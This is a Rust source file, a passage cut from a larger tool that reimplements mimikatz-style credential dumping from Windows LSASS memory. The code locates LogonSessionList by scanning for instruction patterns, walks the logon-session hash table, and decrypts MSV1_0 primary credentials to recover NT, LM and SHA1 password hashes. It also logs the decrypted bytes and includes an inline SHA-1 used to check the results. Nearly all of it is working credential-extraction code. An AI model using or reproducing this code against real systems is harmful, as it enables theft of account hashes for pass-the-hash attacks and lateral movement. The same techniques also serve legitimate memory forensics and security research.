                                domain: domain.clone(),
                                lm_hash: cred.lm_hash,
                                nt_hash: cred.nt_hash,
                                sha1_hash: cred.sha1_hash,
                            },
                        ));
                    }
                }
            } else if !username.is_empty() {
                log::info!(
                    "MSV entry (credentials paged out): bucket={} LUID=0x{:x} user={} domain={}",
                    bucket_idx, luid, username, domain
                );
            }

            current = match vmem.read_virt_u64(current + offsets.flink) {
                Ok(f) => f,
                Err(_) => break,
            };
        }
    }

    if non_empty > 0 && results.is_empty() {
        log::debug!(
            "Hash table 0x{:x}: {} non-empty buckets, 0 credentials extracted (variant luid=0x{:x})",
            table_addr, non_empty, offsets.luid
        );
    }

    results
}

use crate::lsass::patterns::is_heap_ptr;

/// Find LogonSessionList and LogonSessionListCount from pattern.
/// Returns (list_addr, bucket_count). After the pattern, mimikatz resolves
/// two LEA instructions: one for the list (array of LIST_ENTRY heads) and
/// one for the count (DWORD). We find all LEAs and identify which is which.
fn find_list_addr_and_count(vmem: &impl VirtualMemory, pattern_addr: u64) -> Result<(u64, usize)> {
    let data = vmem.read_virt_bytes(pattern_addr, 0x80)?;
    let mut lea_addrs = Vec::new();

    let mut i = 0;
    while i < data.len().saturating_sub(6) {
        let is_lea = (data[i] == 0x48 && data[i + 1] == 0x8D && (data[i + 2] == 0x0D || data[i + 2] == 0x15))
            || (data[i] == 0x4C && data[i + 1] == 0x8D && data[i + 2] == 0x05)
            || (data[i] == 0x4C && data[i + 1] == 0x8D && data[i + 2] == 0x0D);
        if is_lea {
            if let Ok(addr) = patterns::resolve_rip_relative(vmem, pattern_addr + i as u64, 3) {
                lea_addrs.push(addr);
            }
            i += 7; // Skip past this LEA
        } else {
            i += 1;
        }
    }

    if lea_addrs.is_empty() {
        return Err(crate::error::GovmemError::PatternNotFound(
            "LEA for LogonSessionList".to_string(),
        ));
    }

    // Identify which LEA is the count (DWORD) and which is the list (pointer array).
    // The count is a small DWORD (typically 64). The list contains LIST_ENTRY heads.
    let mut list_addr = None;
    let mut count = 0usize;

    for &addr in &lea_addrs {
        let val = vmem.read_virt_u32(addr).unwrap_or(0);
        // LogonSessionListCount is typically 64 or another small power-of-2
        if val >= 4 && val <= 256 {
            count = val as usize;
            log::info!("LogonSessionListCount at 0x{:x} = {}", addr, val);
        } else {
            // Check if it looks like a LIST_ENTRY head (Flink should be a heap or self ptr)
            let flink = vmem.read_virt_u64(addr).unwrap_or(0);
            if flink != 0 && (is_heap_ptr(flink) || flink == addr) {
                list_addr = Some(addr);
                log::info!("LogonSessionList at 0x{:x} (flink=0x{:x})", addr, flink);
            }
        }
    }

    let list = list_addr.ok_or_else(|| {
        crate::error::GovmemError::PatternNotFound("LogonSessionList address".to_string())
    })?;

    if count == 0 {
        count = 1; // Fallback: treat as single list head
    }

    Ok((list, count))
}

fn find_list_addr(vmem: &impl VirtualMemory, pattern_addr: u64) -> Result<u64> {
    find_list_addr_and_count(vmem, pattern_addr).map(|(addr, _)| addr)
}

/// Result of extracting primary credentials (NTLM hashes).
pub struct RawPrimaryCred {
    pub lm_hash: [u8; 16],
    pub nt_hash: [u8; 16],
    pub sha1_hash: [u8; 20],
}

/// Public wrapper for extracting primary credentials from a KIWI_MSV1_0_PRIMARY_CREDENTIALS pointer.
pub fn try_extract_primary_credential(
    vmem: &impl VirtualMemory,
    cred_ptr: u64,
    keys: &CryptoKeys,
) -> Result<RawPrimaryCred> {
    extract_primary_credential(vmem, cred_ptr, keys)
}

fn extract_primary_credential(
    vmem: &impl VirtualMemory,
    cred_ptr: u64,
    keys: &CryptoKeys,
) -> Result<RawPrimaryCred> {
    // KIWI_MSV1_0_PRIMARY_CREDENTIALS (x64):
    //   +0x00: next (PTR, 8)
    //   +0x08: Primary (ANSI_STRING: u16 Len + u16 MaxLen + 4pad + PTR Buf = 16 bytes)
    //   +0x18: Credentials (UNICODE_STRING: u16 Len + u16 MaxLen + 4pad + PTR Buf = 16 bytes)
    //     +0x18: Credentials.Length (u16)
    //     +0x20: Credentials.Buffer (PTR)

    let enc_size = vmem.read_virt_u16(cred_ptr + 0x18)? as usize;

    if enc_size == 0 || enc_size > 0x200 {
        log::info!("  Invalid enc_size {}, trying direct read", enc_size);
        return Err(crate::error::GovmemError::DecryptionError(
            format!("Invalid encrypted credential size: {}", enc_size),
        ));
    }

    let enc_data_ptr = vmem.read_virt_u64(cred_ptr + 0x20)?;
    log::debug!("  Credentials.Buffer = 0x{:x}", enc_data_ptr);
    if enc_data_ptr == 0 {
        return Err(crate::error::GovmemError::DecryptionError(
            "Null encrypted data pointer".to_string(),
        ));
    }

    let enc_data = vmem.read_virt_bytes(enc_data_ptr, enc_size)?;
    log::debug!("  Encrypted data ({} bytes): {}...", enc_size, hex::encode(&enc_data[..std::cmp::min(32, enc_data.len())]));
    let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data)?;
    log::debug!("  Decrypted data ({} bytes):", decrypted.len());
    for (i, chunk) in decrypted[..std::cmp::min(0xA0, decrypted.len())].chunks(16).enumerate() {
        let hex_str: String = chunk.iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" ");
        let ascii: String = chunk.iter().map(|&b| if (0x20..0x7f).contains(&b) { b as char } else { '.' }).collect();
        log::debug!("    {:04x}: {}  {}", i * 16, hex_str, ascii);
    }

    // Try each offset variant and pick the one that makes sense.
    // Validation: NT hash should be non-zero. LM hash is zero on most modern systems.
    // SHA1 = SHA1(NT hash) provides cross-validation when NT is non-zero.
    let mut best_result: Option<RawPrimaryCred> = None;

    for (vi, offsets) in PRIMARY_CRED_OFFSET_VARIANTS.iter().enumerate() {
        let nt_off = offsets.nt_hash as usize;
        let lm_off = offsets.lm_hash as usize;
        let sha1_off = offsets.sha1_hash as usize;

        if decrypted.len() < sha1_off + 20 {
            continue;
        }

        let mut nt_hash = [0u8; 16];
        let mut lm_hash = [0u8; 16];
        let mut sha1_hash = [0u8; 20];
        nt_hash.copy_from_slice(&decrypted[nt_off..nt_off + 16]);
        lm_hash.copy_from_slice(&decrypted[lm_off..lm_off + 16]);
        sha1_hash.copy_from_slice(&decrypted[sha1_off..sha1_off + 20]);

        // NT hash must be non-zero
        if nt_hash == [0u8; 16] {
            continue;
        }

        // Cross-validate: SHA1(NT) should match sha1_hash (strongest validation)
        let sha1_valid = sha1_digest(&nt_hash) == sha1_hash;

        if sha1_valid {
            log::info!(
                "  Using primary cred offset variant {} (nt=0x{:x}, lm=0x{:x}, sha1=0x{:x}) [SHA1 validated]",
                vi, offsets.nt_hash, offsets.lm_hash, offsets.sha1_hash
            );
            best_result = Some(RawPrimaryCred { lm_hash, nt_hash, sha1_hash });
            break;
        }
    }

    // Fallback: use first variant even if validation fails
    if best_result.is_none() {
        let offsets = &PRIMARY_CRED_OFFSET_VARIANTS[0];
        let nt_off = offsets.nt_hash as usize;
        let lm_off = offsets.lm_hash as usize;
        let sha1_off = offsets.sha1_hash as usize;
        let mut nt_hash = [0u8; 16];
        let mut lm_hash = [0u8; 16];
        let mut sha1_hash = [0u8; 20];
        if decrypted.len() >= sha1_off + 20 {
            nt_hash.copy_from_slice(&decrypted[nt_off..nt_off + 16]);
            lm_hash.copy_from_slice(&decrypted[lm_off..lm_off + 16]);
            sha1_hash.copy_from_slice(&decrypted[sha1_off..sha1_off + 20]);
        }
        best_result = Some(RawPrimaryCred { lm_hash, nt_hash, sha1_hash });
    }

    Ok(best_result.unwrap())
}

/// Minimal inline SHA-1 for cross-validating NT hash against SHA1 field.
/// Avoids external crate dependency.
fn sha1_digest(data: &[u8]) -> [u8; 20] {
    let (mut h0, mut h1, mut h2, mut h3, mut h4) =
        (0x67452301u32, 0xEFCDAB89u32, 0x98BADCFEu32, 0x10325476u32, 0xC3D2E1F0u32);
    let bit_len = (data.len() as u64) * 8;
    let mut msg = data.to_vec();
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bit_len.to_be_bytes());
    for block in msg.chunks(64) {
        let mut w = [0u32; 80];
        for i in 0..16 {
            w[i] = u32::from_be_bytes([block[i * 4], block[i * 4 + 1], block[i * 4 + 2], block[i * 4 + 3]]);
        }
        for i in 16..80 {
            w[i] = (w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]).rotate_left(1);
        }
        let (mut a, mut b, mut c, mut d, mut e) = (h0, h1, h2, h3, h4);
        for (i, &wi) in w.iter().enumerate() {
            let (f, k) = match i {
                0..=19 => ((b & c) | ((!b) & d), 0x5A827999u32),
                20..=39 => (b ^ c ^ d, 0x6ED9EBA1u32),
                40..=59 => ((b & c) | (b & d) | (c & d), 0x8F1BBCDCu32),
                _ => (b ^ c ^ d, 0xCA62C1D6u32),
            };
            let temp = a.rotate_left(5).wrapping_add(f).wrapping_add(e).wrapping_add(k).wrapping_add(wi);
            e = d; d = c; c = b.rotate_left(30); b = a; a = temp;
        }
        h0 = h0.wrapping_add(a); h1 = h1.wrapping_add(b); h2 = h2.wrapping_add(c);
        h3 = h3.wrapping_add(d); h4 = h4.wrapping_add(e);
    }
    let mut r = [0u8; 20];
    r[0..4].copy_from_slice(&h0.to_be_bytes());
    r[4..8].copy_from_slice(&h1.to_be_bytes());
    r[8..12].copy_from_slice(&h2.to_be_bytes());
    r[12..16].copy_from_slice(&h3.to_be_bytes());
    r[16..20].copy_from_slice(&h4.to_be_bytes());
    r
}
